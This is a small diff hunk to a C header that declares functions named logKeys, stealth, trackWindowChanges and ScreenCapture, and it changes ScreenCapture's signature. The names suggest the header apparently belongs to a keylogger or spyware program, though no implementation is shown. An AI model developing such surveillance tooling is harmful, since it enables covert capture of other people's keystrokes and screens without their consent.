@@ -9,7 +9,7 @@ void logKeys();
 void parse();
 void stealth();
 void trackWindowChanges();
-bool ScreenCapture(int, int, int, int, char *);
+void ScreenCapture(char *);
 
 #endif // HEADER_INCLUDED
 
